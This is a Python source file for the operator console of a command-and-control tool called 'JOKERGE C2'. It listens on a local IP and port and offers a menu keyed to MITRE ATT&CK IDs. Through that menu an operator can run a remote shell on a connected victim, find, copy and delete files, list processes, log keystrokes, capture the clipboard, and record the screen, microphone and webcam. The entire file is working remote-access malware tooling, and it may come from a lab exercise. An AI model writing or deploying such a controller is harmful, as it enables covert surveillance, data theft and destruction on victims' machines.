import socket
import struct
import os
from datetime import date, datetime
import cv2
import numpy as np
import subprocess 
from PIL import Image, ImageGrab
import pyperclip
import io
from pynput import keyboard
import wave
import pyaudio
import time
import pickle
import platform
import sys

if __name__ == "__main__":
    
    def receive_chunks(length, conn, need_bytes=False):
        data = []
        chunks_q = length // 1024 + 1
        for _ in range(chunks_q):
            data.append(conn.recv(1024))
        if not need_bytes:
            return b"".join(data).decode("utf-8")
        else:
            return b"".join(data)

       
    def sys_info():
        print("Getting sysinformation...")
        len = conn.recv(2048).decode()
        print (len)

    def cli_handler():
        print("'exit' to leave cli input\nWrite CLI command:\n") 
        while True:
            command_cli = str(input(">>> "))
            if command_cli == "exit":
                conn.send(bytes (command_cli, 'utf-8'))
                break
            conn.send(bytes (command_cli, 'utf-8'))
            print(conn.recv(2048).decode())

    def discover_handler():
        file = input("Enter file/directory to find:\n>>>")
        conn.send(bytes (file, 'utf-8'))
        len = conn.recv(10).decode()
        lenint = int(len)
        print (receive_chunks (lenint, conn))

    
    def remote_copy():
        file = input("Enter filename to copy:\n>>>")
        conn.send(bytes (file, 'utf-8'))
        len = conn.recv(10).decode()
        file = receive_chunks (int(len), conn, need_bytes=True)
        filename = input(f"Enter filename to write file:\n>>>")
        open(filename, 'wb').write(file)

    def remote_delete():
        file = input("Enter filename to delete:\n>>>")
        conn.send(bytes (file, 'utf-8'))
        print(conn.recv(2048).decode(), file)

    def process_discovery():
        try:
            Len = conn.recv(10).decode().split("\n")[0]
            length = int(Len)  
            with open('tasklists.txt', 'w', encoding='utf-8') as f:  
                f.write(receive_chunks(length, conn))
        except ValueError:
            print("Error: Invalid length received from connection.")
        except UnicodeEncodeError as e:
            print(f"Encoding error: {e}")


    
    def keylogger():
        try:
            while True:
                print(conn.recv(1024).decode(), end=" ", flush=True)
        except KeyboardInterrupt:
            print()
            conn.sendall(b'Terminate')
    
    def clipboard_capture():
        print(conn.recv(2048).decode())

    def get_screen():
        print("Getting screenshot...")
        
        size = conn.recv(8)
        size = int.from_bytes(size, byteorder='big')
        
        image_data = b''
        while len(image_data) < size:
            data = conn.recv(1024)
            if not data:
                break
            image_data += data
        
        image = Image.open(io.BytesIO(image_data))
        
        timestamp = date.today().strftime('%Y-%m-%d_%H-%M-%S') 
        filename = f"screen_{timestamp}.png"
        
        image.save(filename)
        print(f"Successfully saved {filename}")

    def audio_capture():
        desired_duration = float(input("Enter duration: "))
        conn.sendall(struct.pack("f", desired_duration))  

        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')  
        filename = f"audio_capture_{timestamp}.wav"
        conn.sendall(filename.encode())  

        start_signal = conn.recv(5).decode()
        if start_signal != "start":
            print("Error: Did not receive start signal.")
            return

        try:
            with wave.open(filename, 'wb') as file:
                file.setnchannels(1)
                file.setsampwidth(2) 
                file.setframerate(44100) 

                while True:
                    audio = conn.recv(1024)
                    if not audio or b'done' in audio:
                        break
                    file.writeframes(audio)

        except Exception as e:
            print(f"An error occurred: {e}")
        else:
            print(f"Audio saved in {filename}")

    def video_capture():
        filename = "videocap" + str(date.today().strftime('%Y-%m-%d-%H-%M-%S')) + ".avi"

        conn.sendall(filename.encode())
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))

        try:
            print("Capturing video...")
            while True:
                data_size = conn.recv(4)
                if not data_size:
                    break

                packed_data_size = struct.unpack("I", data_size)[0]
                if packed_data_size == 0:
                    break

                frame_data = b""
                while len(frame_data) < packed_data_size:
                    packet = conn.recv(min(4096, packed_data_size - len(frame_data)))
                    if not packet:
                        break
                    frame_data += packet

                frame = np.frombuffer(frame_data, dtype=np.uint8).reshape((480, 640, 3))
                out.write(frame)
        finally:
            out.release()
            print(f"**Video {filename} successfully captured")

    def display_menu():
        print("""
        ⡟⠋⠉⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⢿⣿
        ⣿⠀⠀⠀⠀⠀⠀⠉⠻⠿⣿⡿⣿⣿⣿⣿⣿⠿⠟⠋⠁⠀⠀⠀⢰⣿
        ⣿⣦⠀⠀⠀⠦⢄⣤⠆⠀⠀⠀⠹⠟⠛⠀⠀⠰⠦⠖⠋⠀⠀⢰⣿⣿
        ⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣦⠀⠀⠀⠀⠀⠀⢠⣶⣾⣿⢿
        ⣿⣿⣿⣿⣦⠀⠀⢀⣠⣤⣾⣿⣿⣿⣿⣿⣵⣶⣦⣤⣶⣾⣿⣿⡟⣼
        ⣷⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢣⣿
        ⣿⣧⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣠⣿⣿
        ⣿⣿⣦⠘⣿⢿⣿⣿⣿⣯⣟⢿⣿⣿⣿⢿⣿⣿⣿⣿⠿⠇⣴⣿⣿⣿
        ⣿⣿⣿⣷⡄⠘⠛⠛⣿⣿⣿⣿⣶⣿⣶⣿⣿⠟⠋⠀⠀⣸⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣤⣀⣀⣀⣀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿
        JOKERGE C2
        
        Choose an option:
        1. T1082 – System Information Discovery
        2. T1059 – Command-Line Interface
        3. T1083 – File and Directory Discovery
        4. T1105 – Remote File Copy
        5. T1107 – File Deletion
        6. T1057 – Process Discovery
        7. T1056 – Input Capture
        8. T1115 – Clipboard Data
        9. T1113 – Screen Capture
        10. T1123 – Audio Capture
        11. T1125 – Video Capture
        Type 'exit' to terminate the session.
        """)

        

    def handle_client_connection(conn):
        def send_chunks(length, data):
            for i in range(0, length, 1024):
                conn.send(data[i:i + 1024])
    
        try:
            while True:
                display_menu()
                command = str(input("\n> "))
                conn.send(bytes(command, "utf-8"))

                if command == "1":
                    sys_info()

                elif command == "2":
                    cli_handler()
                    continue

                elif command == "3":
                    discover_handler()

                elif command == "4":
                    remote_copy()
                    continue

                elif command == "5":
                    remote_delete()

                elif command == "6":
                    process_discovery()

                elif command == "7":
                    keylogger()

                elif command == "8":
                    clipboard_capture()
                    continue
            
                elif command == "9":
                    get_screen()
            
                elif command == "10":  
                    audio_capture()
                    continue
            
                elif command == "11":
                    video_capture()

                elif command == "exit":
                    break

                else:
                    print("ERROR: Wrong input")
        except Exception as e:
            print(f"Error handling client: {str(e)}")
        finally:
            conn.close()
            s.close()


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        host = "192.168.25.128"
        port = 12345
        s.bind((host, port))
        s.listen(5)
        print(f"Server has been started.")

        conn, addr = s.accept()
        print(f"{addr} has been connected to the server")
        handle_client_connection(conn)
        



